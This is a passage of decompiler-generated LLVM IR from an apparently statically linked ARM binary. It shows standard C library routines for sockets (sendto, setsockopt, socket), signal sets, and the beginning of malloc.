  %v2_12f38.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12f38

dec_label_pc_12f38:                               ; preds = %entry, %dec_label_pc_12f20
  %v1_12f3c = phi i32 [ %v0_12f10, %entry ], [ -1, %dec_label_pc_12f20 ]
  %v2_12f38 = phi i32 [ %v3_12efc, %entry ], [ %v2_12f38.pre, %dec_label_pc_12f20 ]
  store i32 %v2_12f38, i32* @r4, align 4
  ret i32 %v1_12f3c

; uselistorder directives
  uselistorder i32 %v0_12f10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f38, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12f40:
  %v0_12f40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12f40, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12f40
  %v2_12f44 = load i32, i32* @r8, align 4
  %v8_12f44 = lshr i32 %v2_12f44, %arg2
  %v9_12f44 = and i32 %v8_12f44, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12f40, %bb
  %v10_12f44 = phi i32 [ %arg1, %dec_label_pc_12f40 ], [ %v9_12f44, %bb ]
  ret i32 %v10_12f44

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12f48 = load i32, i32* @r4, align 4
  store i32 %v3_12f48, i32* %stack_var_-32, align 4
  %v9_12f48 = load i32, i32* @r6, align 4
  %v12_12f48 = load i32, i32* @r7, align 4
  %v15_12f48 = load i32, i32* @r8, align 4
  %v18_12f48 = load i32, i32* @sb, align 4
  %v21_12f48 = load i32, i32* @sl, align 4
  %v24_12f48 = load i32, i32* @lr, align 4
  %v4_12f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_12f60 = icmp eq i32 %v4_12f58, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12f60, label %dec_label_pc_12f80, label %dec_label_pc_12f8c

dec_label_pc_12f80:                               ; preds = %entry
  store i32 %v3_12f48, i32* @r4, align 4
  store i32 %v12_12f48, i32* @r7, align 4
  store i32 %v15_12f48, i32* @r8, align 4
  store i32 %v18_12f48, i32* %sb.global-to-local, align 4
  %v0_12f88 = call i32 @__sys_sendto()
  br label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %entry, %dec_label_pc_12f80
  %v0_12f8c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12f8c, i32* @r5, align 4
  %v0_12fa0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12fa0, i32* @r0, align 4
  %v0_12fa8 = call i32 @__sys_sendto()
  store i32 %v0_12fa8, i32* @r4, align 4
  %v0_12fb0 = load i32, i32* @r5, align 4
  %v1_12fb4 = call i32 @__libc_disable_asynccancel(i32 %v0_12fb0)
  %v0_12fb8 = load i32, i32* @r4, align 4
  %v2_12fc0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12fc0, i32* @r4, align 4
  store i32 %v9_12f48, i32* @r6, align 4
  store i32 %v12_12f48, i32* @r7, align 4
  store i32 %v15_12f48, i32* @r8, align 4
  store i32 %v18_12f48, i32* @sb, align 4
  store i32 %v21_12f48, i32* @sl, align 4
  store i32 %v24_12f48, i32* @lr, align 4
  ret i32 %v0_12fb8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f8c, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12fd0 = load i32, i32* @r4, align 4
  store i32 %v3_12fd0, i32* %stack_var_-12, align 4
  %v0_12fe0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fe0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fe0, -4095
  br i1 %tmp, label %dec_label_pc_13008, label %dec_label_pc_12ff0

dec_label_pc_12ff0:                               ; preds = %entry
  %v0_12ff4 = call i32 @__aeabi_read_tp()
  %v3_12ff8 = load i16, i16* @global_var_23068.363, align 2
  %v4_12ff8 = sext i16 %v3_12ff8 to i32
  %v0_12ffc = load i32, i32* %r2.global-to-local, align 4
  %v1_12ffc = sub i32 0, %v0_12ffc
  store i32 %v1_12ffc, i32* %r2.global-to-local, align 4
  %v3_13000 = add i32 %v4_12ff8, %v0_12ff4
  %v4_13000 = inttoptr i32 %v3_13000 to i32*
  store i32 %v1_12ffc, i32* %v4_13000, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13008.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %entry, %dec_label_pc_12ff0
  %v1_1300c = phi i32 [ %v0_12fe0, %entry ], [ -1, %dec_label_pc_12ff0 ]
  %v2_13008 = phi i32 [ %v3_12fd0, %entry ], [ %v2_13008.pre, %dec_label_pc_12ff0 ]
  store i32 %v2_13008, i32* @r4, align 4
  ret i32 %v1_1300c

; uselistorder directives
  uselistorder i32 %v0_12fe0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13008, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13010:
  %v0_13010 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13010, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13010
  %v2_13014 = load i32, i32* @r8, align 4
  %v4_13014 = and i32 %v2_13014, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13010, %bb
  %v5_13014 = phi i32 [ %arg1, %dec_label_pc_13010 ], [ %v4_13014, %bb ]
  ret i32 %v5_13014

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13018 = load i32, i32* @r7, align 4
  store i32 %v3_13018, i32* %stack_var_-8, align 4
  %v0_13024 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13024, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13024, -4095
  br i1 %tmp, label %dec_label_pc_1304c, label %dec_label_pc_13034

dec_label_pc_13034:                               ; preds = %entry
  %v0_13038 = call i32 @__aeabi_read_tp()
  %v3_1303c = load i16, i16* @global_var_23068.363, align 2
  %v4_1303c = sext i16 %v3_1303c to i32
  store i32 %v4_1303c, i32* @r3, align 4
  %v0_13040 = load i32, i32* %r2.global-to-local, align 4
  %v1_13040 = sub i32 0, %v0_13040
  store i32 %v1_13040, i32* %r2.global-to-local, align 4
  %v3_13044 = add i32 %v4_1303c, %v0_13038
  %v4_13044 = inttoptr i32 %v3_13044 to i32*
  store i32 %v1_13040, i32* %v4_13044, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1304c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %entry, %dec_label_pc_13034
  %v1_13050 = phi i32 [ %v0_13024, %entry ], [ -1, %dec_label_pc_13034 ]
  %v2_1304c = phi i32 [ %v3_13018, %entry ], [ %v2_1304c.pre, %dec_label_pc_13034 ]
  store i32 %v2_1304c, i32* @r7, align 4
  ret i32 %v1_13050

; uselistorder directives
  uselistorder i32 %v0_13024, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1304c, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13054:
  %v0_13054 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13054, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13054
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13054, %bb
  %v4_13058 = phi i32 [ %arg1, %dec_label_pc_13054 ], [ 0, %bb ]
  ret i32 %v4_13058

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_13074, label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %entry
  %v7_13070 = icmp slt i32 %arg2, 65
  br i1 %v7_13070, label %dec_label_pc_13090, label %dec_label_pc_13074

dec_label_pc_13074:                               ; preds = %dec_label_pc_1306c, %entry
  %v0_13078 = call i32 @__aeabi_read_tp()
  %v3_1307c = load i16, i16* @global_var_23068.363, align 2
  %v4_1307c = sext i16 %v3_1307c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13088 = add i32 %v4_1307c, %v0_13078
  %v4_13088 = inttoptr i32 %v3_13088 to i32*
  store i32 22, i32* %v4_13088, align 4
  %v0_13098.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13098

dec_label_pc_13090:                               ; preds = %dec_label_pc_1306c
  %v0_13090 = call i32 @__sigaddset()
  store i32 %v0_13090, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13098

dec_label_pc_13098:                               ; preds = %dec_label_pc_13074, %dec_label_pc_13090
  %v0_13098 = phi i32 [ %v0_13098.pre, %dec_label_pc_13074 ], [ %v0_13090, %dec_label_pc_13090 ]
  ret i32 %v0_13098

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13098, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_130b4 = add i32 %tmp, 4
  %v3_130b4 = inttoptr i32 %v2_130b4 to i32*
  store i32 0, i32* %v3_130b4, align 4
  %v1_130b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_130b8 = inttoptr i32 %v1_130b8 to i32*
  store i32 0, i32* %v2_130b8, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_130c0 = load i32, i32* @r4, align 4
  store i32 %v3_130c0, i32* %stack_var_-16, align 4
  %v6_130c0 = load i32, i32* @r5, align 4
  %v9_130c0 = load i32, i32* @r6, align 4
  %v7_130c8 = icmp eq i32 %arg2, -1
  br i1 %v7_130c8, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_130d0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_130ec

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_130f4

dec_label_pc_130ec:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r6, align 4
  %v7_130f0 = icmp slt i32 %arg1, 65
  br i1 %v7_130f0, label %dec_label_pc_13110, label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %.thread16, %dec_label_pc_130ec
  %v0_130f8 = call i32 @__aeabi_read_tp()
  %v3_130fc = load i16, i16* @global_var_23068.363, align 2
  %v4_130fc = sext i16 %v3_130fc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13108 = add i32 %v4_130fc, %v0_130f8
  %v4_13108 = inttoptr i32 %v3_13108 to i32*
  store i32 22, i32* %v4_13108, align 4
  %v0_13168.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13110:                               ; preds = %dec_label_pc_130ec
  %v2_13110 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13110, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13118 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13118, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13128 = call i32 @__sigaddset()
  %v0_13130 = load i32, i32* @r5, align 4
  store i32 %v0_13130, i32* %r1.global-to-local, align 4
  %v0_13134 = load i32, i32* @r6, align 4
  %v2_13134 = add i32 %v0_13134, 11868
  %v2_13138 = call i32 @__GI___sigismember(i32 %v2_13134, i32 %v0_13130)
  store i32 %v2_13110, i32* %r1.global-to-local, align 4
  %v0_1314c = load i32, i32* @r5, align 4
  %v3_13158 = call i32 @__libc_sigaction(i32 %v0_1314c, i32 %v2_13110, i32 %v2_130d0)
  %v1_1315c = icmp slt i32 %v3_13158, 0
  br i1 %v1_1315c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13110
  %v5_13160 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_13160, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13110
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_130f4, %bb32
  %v0_13168 = phi i32 [ %v5_13160, %bb31 ], [ %v0_13168.pre, %dec_label_pc_130f4 ], [ -1, %bb32 ]
  %v2_13170 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13170, i32* @r4, align 4
  store i32 %v6_130c0, i32* @r5, align 4
  store i32 %v9_130c0, i32* @r6, align 4
  ret i32 %v0_13168

; uselistorder directives
  uselistorder i32 %v2_13110, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_130f4, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13184 = add i32 %arg2, -1
  %v3_13188 = udiv i32 %v1_13184, 32
  %v4_1318c = mul nuw nsw i32 %v3_13188, 4
  %v5_1318c = add i32 %v4_1318c, %arg1
  %v6_1318c = inttoptr i32 %v5_1318c to i32*
  %v7_1318c = load i32, i32* %v6_1318c, align 4
  %v1_13190 = urem i32 %v1_13184, 32
  %v7_13198 = shl i32 1, %v1_13190
  %v8_13198 = and i32 %v7_1318c, %v7_13198
  %v10_13198 = icmp ne i32 %v8_13198, 0
  %. = zext i1 %v10_13198 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13184, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_131a8 = load i32, i32* @r1, align 4
  %v1_131a8 = add i32 %v0_131a8, -1
  %v3_131ac = udiv i32 %v1_131a8, 32
  %v0_131b0 = load i32, i32* @r0, align 4
  %v4_131b0 = mul nuw nsw i32 %v3_131ac, 4
  %v5_131b0 = add i32 %v0_131b0, %v4_131b0
  %v6_131b0 = inttoptr i32 %v5_131b0 to i32*
  %v7_131b0 = load i32, i32* %v6_131b0, align 4
  %v1_131b4 = urem i32 %v1_131a8, 32
  %v7_131bc = shl i32 1, %v1_131b4
  %v8_131bc = or i32 %v7_131b0, %v7_131bc
  store i32 %v8_131bc, i32* %v6_131b0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_131a8, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_131cc = add i32 %arg2, -1
  %v3_131d0 = udiv i32 %v1_131cc, 32
  %v4_131d4 = mul nuw nsw i32 %v3_131d0, 4
  %v5_131d4 = add i32 %v4_131d4, %arg1
  %v6_131d4 = inttoptr i32 %v5_131d4 to i32*
  %v7_131d4 = load i32, i32* %v6_131d4, align 4
  %v1_131d8 = urem i32 %v1_131cc, 32
  %tmp = shl i32 -1, %v1_131d8
  %v8_131e0 = add i32 %tmp, -1
  %v9_131e0 = and i32 %v7_131d4, %v8_131e0
  store i32 %v9_131e0, i32* %v6_131d4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_131cc, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_131f0 = udiv i32 %arg1, 256
  store i32 %v3_131f0, i32* %r1.global-to-local, align 4
  %v2_131f4 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_131f4, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13200 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_131f4, i32 %v0_13200)
  %v0_13204 = load i32, i32* %r1.global-to-local, align 4
  %v1_13204 = add i32 %v0_13204, 1048320
  %v3_13208 = udiv i32 %v1_13204, 65536
  %v1_1320c = and i32 %v3_13208, 8
  %v6_13210 = shl i32 %v0_13204, %v1_1320c
  %v1_13214 = add i32 %v6_13210, 520192
  %v3_13218 = udiv i32 %v1_13214, 65536
  %v1_1321c = and i32 %v3_13218, 4
  %v6_13220 = shl i32 %v6_13210, %v1_1321c
  %v1_13224 = add i32 %v6_13220, 245760
  %v3_13228 = udiv i32 %v1_13224, 65536
  %v1_1322c = and i32 %v3_13228, 2
  %v6_13230 = shl i32 %v6_13220, %v1_1322c
  store i32 %v6_13230, i32* %r1.global-to-local, align 4
  %v1_13234 = sub nsw i32 13, %v1_1320c
  %v2_13238 = sub nsw i32 %v1_13234, %v1_1321c
  %v3_1323c = udiv i32 %v6_13230, 32768
  %v4_1323c = sub nuw nsw i32 -1, %v3_1323c
  %v4_13240 = udiv i32 %v6_13230, 16384
  %v5_13240 = and i32 %v4_13240, %v4_1323c
  %v2_13244 = sub nsw i32 %v2_13238, %v1_1322c
  %v2_13248 = add nsw i32 %v2_13244, %v5_13240
  %v1_1324c = add nsw i32 %v2_13248, 6
  %v0_13250 = load i32, i32* %ip.global-to-local, align 4
  %v6_13250 = lshr i32 %v0_13250, %v1_1324c
  %v3_13254 = mul nsw i32 %v2_13248, 4
  %v1_13258 = add nsw i32 %v3_13254, 32
  %v1_1325c = urem i32 %v6_13250, 4
  %v2_13260 = or i32 %v1_1325c, %v1_13258
  ret i32 %v2_13260

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13268 = load i32, i32* @r4, align 4
  %v6_13268 = load i32, i32* @r5, align 4
  %v9_13268 = load i32, i32* @r6, align 4
  %v12_13268 = load i32, i32* @r7, align 4
  %v15_13268 = load i32, i32* @r8, align 4
  %v18_13268 = load i32, i32* @sb, align 4
  %v21_13268 = load i32, i32* @sl, align 4
  %v24_13268 = load i32, i32* @fp, align 4
  %v27_13268 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  %v4_1327c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 108) to i32*), align 4
  store i32 %v4_1327c, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_13288 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 68) to i32*), align 4
  store i32 %v4_13288, i32* %r1.global-to-local, align 4
  %v0_1328c = load i32, i32* @r0, align 4
  store i32 %v0_1328c, i32* @r5, align 4
  store i32 %v4_1327c, i32* %r2.global-to-local, align 4
  %v2_13294 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13294, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  %v4_132a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  store i32 %v4_132a0, i32* %ip.global-to-local, align 4
  store i32 78508, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_132a0)
  %v0_132ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_132ac, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r1, align 4
  %v4_132b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 16) to i32*), align 4
  store i32 %v4_132b8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_132c4.449 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_132b8)
  %v0_132c4 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_132c4, -32
  br i1 %tmp, label %dec_label_pc_132e8, label %dec_label_pc_132cc

dec_label_pc_132cc:                               ; preds = %entry
  store i32 64908, i32* %r2.global-to-local, align 4
  %v0_132d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_132d0, i32* %r0.global-to-local, align 4
  %v3_132d4 = load i16, i16* @global_var_23068.363, align 2
  %v4_132d4 = sext i16 %v3_132d4 to i32
  store i32 %v4_132d4, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_132e0 = add i32 %v4_132d4, %v0_132d0
  %v4_132e0 = inttoptr i32 %v3_132e0 to i32*
  store i32 12, i32* %v4_132e0, align 4
  br label %dec_label_pc_13b6c

dec_label_pc_132e8:                               ; preds = %entry
  %v1_132e8 = add i32 %v0_132c4, 11
  store i32 %v1_132e8, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v2_132f4 = icmp ugt i32 %v1_132e8, 14
  %v7_132f4 = icmp eq i32 %v1_132e8, 15
  %v2_132f8 = xor i1 %v7_132f4, true
  %v3_132f8 = and i1 %v2_132f4, %v2_132f8
  br i1 %v3_132f8, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_132e8
  %v5_132f8 = and i32 %v1_132e8, -8
  store i32 %v5_132f8, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_132e8, %bb
  %v4_132fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_132fc, i32* @r0, align 4
  %v1_13300 = inttoptr i32 %v4_132fc to i32*
  %v2_13300 = load i32, i32* %v1_13300, align 4
  store i32 %v2_13300, i32* @r4, align 4
  %v2_13304 = xor i1 %v2_132f4, true
  %v3_13304 = or i1 %v7_132f4, %v2_13304
  br i1 %v3_13304, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_13308 = urem i32 %v2_13300, 2
  %v2_13308 = icmp eq i32 %v1_13308, 0
  br i1 %v2_13308, label %dec_label_pc_13310, label %dec_label_pc_13320

dec_label_pc_13310:                               ; preds = %bb143
  %v2_13310 = icmp eq i32 %v2_13300, 0
  br i1 %v2_13310, label %dec_label_pc_13318, label %dec_label_pc_136fc

dec_label_pc_13318:                               ; preds = %dec_label_pc_13310
  %v0_13318 = call i32 @__malloc_consolidate()
  store i32 %v0_13318, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136fc

dec_label_pc_13320:                               ; preds = %bb143
  %v0_13320 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_13320, %v2_13300
  br i1 %tmp204, label %dec_label_pc_13348, label %dec_label_pc_13328

dec_label_pc_13328:                               ; preds = %dec_label_pc_13320
  %v1_13328 = add i32 %v4_132fc, -4
  store i32 %v1_13328, i32* %r1.global-to-local, align 4
  %v3_1332c = udiv i32 %v0_13320, 8
  store i32 %v3_1332c, i32* %r2.global-to-local, align 4
  %v4_13330 = mul nuw i32 %v3_1332c, 4
  %v5_13330 = add i32 %v4_13330, %v1_13328
  %v6_13330 = inttoptr i32 %v5_13330 to i32*
  %v7_13330 = load i32, i32* %v6_13330, align 4
  store i32 %v7_13330, i32* %r0.global-to-local, align 4
  %v2_13334 = icmp eq i32 %v7_13330, 0
  br i1 %v2_13334, label %dec_label_pc_13348, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13328
  %v2_13338 = add i32 %v7_13330, 8
  %v3_13338 = inttoptr i32 %v2_13338 to i32*
  %v4_13338 = load i32, i32* %v3_13338, align 4
  store i32 %v4_13338, i32* %r3.global-to-local, align 4
  store i32 %v2_13338, i32* %r0.global-to-local, align 4
  store i32 %v2_13338, i32* %r4.global-to-local, align 4
  store i32 %v4_13338, i32* %v6_13330, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13348:                               ; preds = %dec_label_pc_13328, %dec_label_pc_13320
  %tmp205 = icmp ugt i32 %v0_13320, 255
  br i1 %tmp205, label %dec_label_pc_13398, label %dec_label_pc_13350

dec_label_pc_13350:                               ; preds = %dec_label_pc_13348
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13358 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  %v3_1335c = udiv i32 %v0_13320, 8
  store i32 %v3_1335c, i32* @r7, align 4
  %v4_13360 = mul nuw i32 %v3_1335c, 8
  %v5_13360 = add i32 %v4_13358, %v4_13360
  store i32 %v5_13360, i32* %r3.global-to-local, align 4
  %v1_13364 = add i32 %v5_13360, 44
  store i32 %v1_13364, i32* %ip.global-to-local, align 4
  %v1_13368 = add i32 %v5_13360, 56
  %v2_13368 = inttoptr i32 %v1_13368 to i32*
  %v3_13368 = load i32, i32* %v2_13368, align 4
  store i32 %v3_13368, i32* %r0.global-to-local, align 4
  %v9_1336c = icmp eq i32 %v3_13368, %v1_13364
  br i1 %v9_1336c, label %dec_label_pc_134f8, label %dec_label_pc_13374

dec_label_pc_13374:                               ; preds = %dec_label_pc_13350
  %v2_13374 = add i32 %v3_13368, %v0_13320
  store i32 %v2_13374, i32* %r3.global-to-local, align 4
  %v1_13378 = add i32 %v2_13374, 4
  %v2_13378 = inttoptr i32 %v1_13378 to i32*
  %v3_13378 = load i32, i32* %v2_13378, align 4
  store i32 %v3_13378, i32* %r2.global-to-local, align 4
  %v1_1337c = add i32 %v3_13368, 12
  %v2_1337c = inttoptr i32 %v1_1337c to i32*
  %v3_1337c = load i32, i32* %v2_1337c, align 4
  store i32 %v3_1337c, i32* %r1.global-to-local, align 4
  %v1_13380 = or i32 %v3_13378, 1
  store i32 %v1_13380, i32* %r2.global-to-local, align 4
  %v1_13384 = add i32 %v3_13368, 8
  store i32 %v1_13384, i32* %r4.global-to-local, align 4
  store i32 %v1_13380, i32* %v2_13378, align 4
  %v0_1338c = load i32, i32* %ip.global-to-local, align 4
  %v1_1338c = load i32, i32* %r1.global-to-local, align 4
  %v2_1338c = add i32 %v1_1338c, 8
  %v3_1338c = inttoptr i32 %v2_1338c to i32*
  store i32 %v0_1338c, i32* %v3_1338c, align 4
  %v0_13390 = load i32, i32* %r1.global-to-local, align 4
  %v1_13390 = load i32, i32* %ip.global-to-local, align 4
  %v2_13390 = add i32 %v1_13390, 12
  %v3_13390 = inttoptr i32 %v2_13390 to i32*
  store i32 %v0_13390, i32* %v3_13390, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13398:                               ; preds = %dec_label_pc_13348
  store i32 %v0_13320, i32* %r0.global-to-local, align 4
  %v1_1339c = call i32 @__malloc_largebin_index(i32 %v0_13320)
  store i32 %v1_1339c, i32* %r0.global-to-local, align 4
  %v0_133a0 = load i32, i32* @r4, align 4
